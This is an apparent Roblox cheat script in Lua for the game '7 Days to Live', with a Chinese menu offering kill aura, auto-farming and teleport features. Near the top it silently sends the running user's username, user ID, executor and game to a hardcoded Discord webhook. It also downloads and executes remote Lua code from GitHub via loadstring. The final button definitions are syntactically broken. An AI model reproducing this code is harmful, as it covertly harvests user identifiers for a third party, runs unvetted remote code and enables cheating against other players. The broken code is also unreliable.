local lp = game.Players.LocalPlayer
local bl = {
    "g",
    "roblox"
}
for _, n in ipairs(bl) do
    if lp.Name == n then
        lp:Kick("名单")
        break
    end
end
local http = game:GetService("HttpService")
local exec = "Unknown"
if syn then
    exec = "Synapse X"
elseif secure_load then
    exec = "Sentinel"
elseif pebc_execute then
    exec = "KRNL"
elseif identifyexecutor then
    exec = identifyexecutor()
elseif hookfunction and checkcaller and setreadonly then
    exec = "Delta"
end
local gName = "Unknown"
pcall(function()
    gName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)
local data = {
    content = string.format("7 gays\nUsername: %s\nDisplay Name: %s\nUser ID: %s\nExecutor: %s\nPlace ID: %s\nPlace Name: %s", lp.Name, lp.DisplayName, lp.UserId, exec, game.PlaceId, gName)
}
local js = http:JSONEncode(data)
local req = syn and syn.request or request or http and http.request
if req then
    req({
        Url = "https://discord.com/api/webhooks/1365735985492791367/KwAe5ObS-nD4pKA4PAVNW8bhTYMK40fprm7lVdr-IpgHHt_2PMhcew30_sdYxRvWrjDN",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = js
    })
end
local L = loadstring(game:HttpGet("https://raw.githubusercontent.com/xaoxaox/Gui/refs/heads/main/Gui.lua"))()
local w = L:CreateWindow("活到 7 天 汉化by du8")
local t = w:AddFolder("主要")
local b = w:AddFolder("杂项")
t:AddToggle({
    text = "杀戮光环",
    state = false,
    callback = function(s)
        _G.ak = s
        if s then
            local r = 100
            task.spawn(function()
                while _G.ak do
                    local c = lp.Character
                    local h = c and c:FindFirstChild("HumanoidRootPart")
                    if h then
                        for _, scp in ipairs(workspace.scps:GetChildren()) do
                            local t = scp:FindFirstChild("HumanoidRootPart") or scp:FindFirstChild("Head")
                            local hum = scp:FindFirstChildWhichIsA("Humanoid")
                            if t and hum and hum.Health > 0 then
                                local d = (t.Position - h.Position).Magnitude
                                if d < r then
                                    local f = t.CFrame + Vector3.new(0, 0.5, 0)
                                    local to = t.CFrame
                                    game.ReplicatedStorage.remotes.shoot:FireServer(f, to)
                                end
                            end
                        end
                    end
                    task.wait(0.25)
                end
            end)
        end
    end
})
t:AddToggle({
    text = "瞬间砍树(靠近树)",
    state = false,
    callback = function(v)
        _G.ct = v
        if v then
            task.spawn(function()
                while _G.ct do
                    game.ReplicatedStorage.remotes.swing_axe:FireServer()
                    task.wait(0.01)
                end
            end)
        end
    end
})
t:AddToggle({
    text = "自动收集废料",
    state = false,
    callback = function(v)
        _G.af = v
        if v then
            task.spawn(function()
                local h = lp.Character:WaitForChild("HumanoidRootPart")
                while _G.af do
                    for _, s in pairs(workspace.scraps:GetChildren()) do
                        if not _G.af then
                            break
                        end
                        local bp = s:FindFirstChildWhichIsA("BasePart")
                        if bp then
                            h.CFrame = bp.CFrame + Vector3.new(0, 2, 0)
                            task.wait(0.1)
                            for _, o in pairs(workspace:GetDescendants()) do
                                if o:IsA("ProximityPrompt") and o.Parent:IsA("BasePart") and (h.Position - o.Parent.Position).Magnitude < 15 then
                                    fireproximityprompt(o)
                                end
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
})
t:AddToggle({
    text = "按钮提示",
    state = false,
    callback = function(v)
        _G.app = v
        if v then
            task.spawn(function()
                local h = lp.Character:WaitForChild("HumanoidRootPart")
                while _G.app do
                    for _, o in pairs(workspace:GetDescendants()) do
                        if o:IsA("ProximityPrompt") and o.Parent:IsA("BasePart") and (h.Position - o.Parent.Position).Magnitude < 15 then
                            fireproximityprompt(o)
                        end
                    end
                    task.wait(0.001)
                end
            end)
        end
    end
})
t:AddToggle({
    text = "主动接近提示",
    state = false,
    callback = function(v)
        _G.fapp = v
        if v then
            task.spawn(function()
                local c = lp.Character or lp.CharacterAdded:Wait()
                local h = c:WaitForChild("HumanoidRootPart")
                local r = 15
                while _G.fapp do
                    for _, o in pairs(workspace:GetDescendants()) do
                        if not _G.fapp then
                            break
                        end
                        if o:IsA("ProximityPrompt") and o.Parent:IsA("BasePart") then
                            if (h.Position - o.Parent.Position).Magnitude <= r then
                                fireproximityprompt(o)
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end
    end
})
b:AddButton({
    text = "传送到重生点",
    callback = function()
        lp.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(57, 42, 416)
    end
})
b:AddButton({
    text = "瞬间饱腹(吃任意一个食物)",
    callback = function()
        for i = 1, 20 do
            pcall(function()
                lp.Character.Cabbage.eat:FireServer()
            end)
            pcall(function()
                lp.Character.Beans.eat:FireServer()
            end)
            pcall(function()
                lp.Character.Berry.eat:FireServer()
            end)
        end
    end
})
b:AddButton({
   text = "脚本1"
Code = "o.O"loadstring(game:HttpGet("https://github.com/XiaoyeQWQ/state/raw/refs/heads/main/7days-live-free.lua"))()
})
b:AddButton({
   text = "传送屋顶"
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(48.517513275146484, 65.71894836425781, 417.6216125488281) 
})
b:AddButton({
   text = "传送小屋"
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(61.199459075927734, 41.71894836425781, 418.4039611816406) 
})
b:AddLabel({
    text = "原作者: Pall 汉化by du8"
})
L:Init()